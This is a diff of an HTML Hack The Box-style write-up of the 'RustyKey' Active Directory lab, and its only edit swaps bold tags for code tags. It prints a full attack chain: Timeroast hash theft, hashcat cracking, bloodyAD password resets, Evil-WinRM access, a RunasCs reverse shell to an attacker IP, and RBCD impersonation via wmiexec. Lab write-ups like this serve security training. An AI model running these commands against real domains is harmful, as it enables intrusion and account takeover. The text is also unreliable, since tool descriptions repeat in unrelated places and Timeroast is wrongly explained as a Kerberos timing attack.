@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>RustyKey is a Hard difficulty Windows AD machine. Starting with provided credentials, the attack exploits a <strong>Timeroast</strong> vulnerability to extract and crack machine account hashes. The cracked password enables adding the attacker to a HelpDesk group via BloodHound-guided AD abuse. Through multiple password resets and <strong>Protected Users group</strong> manipulation, WinRM access is gained. Escalation continues through a <strong>COM object DLL hijack</strong> and concludes with <strong>Resource-Based Constrained Delegation (RBCD)</strong> to impersonate a backup admin account.</p>
+      <p>RustyKey is a Hard difficulty Windows AD machine. Starting with provided credentials, the attack exploits a <code>Timeroast</code> vulnerability to extract and crack machine account hashes. The cracked password enables adding the attacker to a HelpDesk group via BloodHound-guided AD abuse. Through multiple password resets and <code>Protected Users group</code> manipulation, WinRM access is gained. Escalation continues through a <code>COM object DLL hijack</code> and concludes with <code>Resource-Based Constrained Delegation (RBCD)</code> to impersonate a backup admin account.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>Assumed-breach scenario with credentials: <code>rr.parker / 8#t5HE8L!W3A</code>.</p>
@@ -233,7 +233,7 @@ LDAP        10.129.201.253  389    DC               [-] rustykey.htb\rr.parker:8
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250701195328.png" alt="BloodHound Tier Zero analysis" loading="lazy" /><span class="img-caption">BloodHound Tier Zero analysis</span></div>
       <h2 class="writeup-section-title">Foothold: Timeroast Attack</h2>
       <h3 class="writeup-sub-title">Kerberos Encryption Analysis</h3>
-      <p>I check which encryption types are used for TGS tickets. The domain uses <strong>RC4-HMAC</strong>, which is vulnerable to the <strong>Timeroast</strong> attack — a technique that exploits timing differences in Kerberos authentication to extract machine account password hashes.</p>
+      <p>I check which encryption types are used for TGS tickets. The domain uses <code>RC4-HMAC</code>, which is vulnerable to the <code>Timeroast</code> attack — a technique that exploits timing differences in Kerberos authentication to extract machine account password hashes.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/rr.parker:&#x27;8#t5HE8L!W3A&#x27;      
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
@@ -262,7 +262,7 @@ $sntp-ms$349663cbc21ebf8c401cb53d2b6146b9$1c0111e900000000000a16a94c4f434cec0f06
       <p>I crack the Timeroast hashes using hashcat (module 31300). The password <code>Rusty88!</code> is found for the <code>IT-Computer3$</code> machine account.</p>
       <div class="code-block"><pre><code>./hashcat-6.2.6/hashcat.bin -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
 [sudo] password for kali:</code></pre></div>
-      <p>I use <strong>hashcat</strong> to crack the extracted hashes using the appropriate hash mode.</p>
+      <p>I use <code>hashcat</code> to crack the extracted hashes using the appropriate hash mode.</p>
       <div class="code-block"><pre><code>Cracked password in the file
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
@@ -278,7 +278,7 @@ Check user that is known to that RID
 SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)</code></pre></div>
       <h2 class="writeup-section-title">Lateral Movement: AD Group Manipulation</h2>
       <h3 class="writeup-sub-title">BloodHound Path from IT-Computer3$</h3>
-      <p>BloodHound reveals the IT-Computer3$ account can add itself to the <strong>HelpDesk</strong> OU. I use <code>bloodyAD</code> after creating a TGT ticket for the machine account.</p>
+      <p>BloodHound reveals the IT-Computer3$ account can add itself to the <code>HelpDesk</code> OU. I use <code>bloodyAD</code> after creating a TGT ticket for the machine account.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250701234538.png" alt="IT-Computer3$ can add to HelpDesk" loading="lazy" /><span class="img-caption">IT-Computer3$ can add to HelpDesk</span></div>
       <p>I use <code>net rpc group addmem</code> to remotely add the user to the target Active Directory group. This command authenticates via the SMB protocol using the provided domain credentials and performs the group membership modification on the Domain Controller. After this change, the user inherits all permissions associated with the new group.</p>
       <div class="code-block"><pre><code>net rpc group addmem &quot;HelpDesk&quot; &quot;HelpDesk&quot; -U &quot;rustykey.htb&quot;/&quot;IT-Computer3$&quot;%&#x27;Rusty88!&#x27; -S &quot;dc.rustykey.htb&quot; 
@@ -296,7 +296,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
       <h3 class="writeup-sub-title">Password Changes & Protected Users</h3>
       <p>With HelpDesk access, I can change passwords and add users to the Protected Objects group. I change passwords for target users.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250702195707.png" alt="Password change capabilities in BloodHound" loading="lazy" /><span class="img-caption">Password change capabilities in BloodHound</span></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password bb.morgan &#x27;Hallo@123&#x27;
 [+] Password changed successfully!
@@ -312,14 +312,14 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password dd.ali &#x27;Hallo@123&#x27;
 [+] Password changed successfully!</code></pre></div>
-      <p>TGT generation fails because the <strong>Protected Users</strong> group enforces AES-only encryption, blocking RC4-HMAC. I must remove the users from this group first.</p>
+      <p>TGT generation fails because the <code>Protected Users</code> group enforces AES-only encryption, blocking RC4-HMAC. I must remove the users from this group first.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123                       
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250702200839.png" alt="Protected Users blocking RC4" loading="lazy" /><span class="img-caption">Protected Users blocking RC4</span></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k remove groupMember &#x27;PROTECTED OBJECTS&#x27; &#x27;IT&#x27;                               
 [-] IT removed from PROTECTED OBJECTS</code></pre></div>
@@ -333,7 +333,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
       <p>I authenticate with the TGT and connect via Evil-WinRM. The user flag and an internal PDF are found on the Desktop.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ export KRB5CCNAME=bb.morgan.ccache</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
                                         
@@ -347,7 +347,7 @@ Warning: User is not needed for Kerberos auth. Ticket will be used
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; ls
 
@@ -364,7 +364,7 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; cat user.txt
 1f9c50b4f868d12b441f4188fc9847e2</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">1f9c50b4f868d12b441f4188fc9847e2</code></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; download internal.pdf
                                         
 Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
@@ -391,7 +391,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; upload /home/kali/HTB/RustyKey/RunasCs/RunasCs.cs
 
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; .\RunasCs_net2.exe ee.reed Hallo@123 Powershell.exe -r 10.10.16.49:4444
 [*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
 [*] Warning: The logon for user &#x27;ee.reed&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
@@ -486,7 +486,7 @@ C:\Windows&gt;whoami
 whoami
 rustykey\mm.turner</code></pre></div>
       <h3 class="writeup-sub-title">RBCD to Domain Admin</h3>
-      <p>BloodHound shows <code>mm.turner</code> can impersonate <code>dc.rustykey.htb</code>. I set up <strong>Resource-Based Constrained Delegation</strong> — allowing the IT-COMPUTER3$ machine account to impersonate the backupadmin user to the DC.</p>
+      <p>BloodHound shows <code>mm.turner</code> can impersonate <code>dc.rustykey.htb</code>. I set up <code>Resource-Based Constrained Delegation</code> — allowing the IT-COMPUTER3$ machine account to impersonate the backupadmin user to the DC.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155258.png" alt="RBCD delegation path in BloodHound" loading="lazy" /><span class="img-caption">RBCD delegation path in BloodHound</span></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155945.png" alt="Delegation permissions" loading="lazy" /><span class="img-caption">Delegation permissions</span></div>
       <p>I inspect the AD computer object's delegation properties to understand the current RBCD configuration.</p>
@@ -504,7 +504,7 @@ PrincipalsAllowedToDelegateToAccount : {}
 SamAccountName                       : DC$
 SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
 UserPrincipalName                    :</code></pre></div>
-      <p>I configure the AD computer object for <strong>Resource-Based Constrained Delegation (RBCD)</strong>, allowing the specified machine account to impersonate users to this service.</p>
+      <p>I configure the AD computer object for <code>Resource-Based Constrained Delegation (RBCD)</code>, allowing the specified machine account to impersonate users to this service.</p>
       <div class="code-block"><pre><code>PS C:\Windows&gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &quot;IT-COMPUTER3$&quot;
 Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &quot;IT-COMPUTER3$&quot;</code></pre></div>
       <p>I generate a service ticket impersonating backupadmin, export it, and authenticate using <code>wmiexec.py</code>.</p>
@@ -519,7 +519,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 [*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</code></pre></div>
       <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</code></pre></div>
-      <p>I use <strong>RunasCs</strong> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
+      <p>I use <code>RunasCs</code> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
 └─$ wmiexec.py -k -no-pass &#x27;RUSTYKEY.HTB/backupadmin@dc.rustykey.htb&#x27;
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
